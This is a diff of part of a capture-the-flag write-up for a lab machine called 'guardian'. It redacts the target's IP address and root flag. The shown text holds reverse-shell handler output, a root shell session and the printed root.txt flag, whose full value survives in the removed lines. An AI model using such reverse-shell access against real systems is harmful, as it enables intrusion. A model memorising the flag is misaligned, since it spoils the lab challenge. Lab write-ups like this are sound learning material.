-[+] Got reverse shell from guardian~10.129.101.248-Linux-x86_64 😍 Assigned SessionID <1>
+[+] Got reverse shell from guardian~10.129.xx.xx-Linux-x86_64 😍 Assigned SessionID <1>
 [+] Attempting to upgrade shell to PTY...
-[+] Got reverse shell from guardian~10.129.101.248-Linux-x86_64 😍 Assigned SessionID <2>
+[+] Got reverse shell from guardian~10.129.xx.xx-Linux-x86_64 😍 Assigned SessionID <2>
 [+] Shell upgraded successfully using /usr/bin/python3! 💪
 [+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
-[+] Logging to /home/kali/.penelope/guardian~10.129.101.248-Linux-x86_64/2025_09_01-10_39_29-254.log 📜
+[+] Logging to /home/kali/.penelope/guardian~10.129.xx.xx-Linux-x86_64/2025_09_01-10_39_29-254.log 📜
 ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 root@guardian:/etc/apache2#
 ```
@@ -1321,7 +1322,7 @@ drwx------  2 root root 4096 Apr 11 20:24 .ssh
 -rw-r-----  1 root root   33 Sep  1 09:58 root.txt
 drwxr-xr-x  2 root root 4096 Aug 13 11:57 scripts
 root@guardian:/root# cat root.txt
-3716405fe817ce458866ff864be5b724
+371640xxxxxxxxxxxxxxxxxxxxxxxxxx
 ```
 
 Grab our `root.txt` flag.
@@ -1394,7 +1395,7 @@ drwxr-xr-x  2 root root 4096 Aug 13 11:57 scripts
 drwx------  2 root root 4096 Apr 11 20:24 .ssh
 -rw-r--r--  1 root root  205 Jul 14 16:56 .wget-hsts
 bash-5.1# cat root.txt
-3716405fe817ce458866ff864be5b724
+371640xxxxxxxxxxxxxxxxxxxxxxxxxx
 ```
 
 > *Also there are other way to leverage to `root`, if you guys found other way, hit me out! :>, tks.*
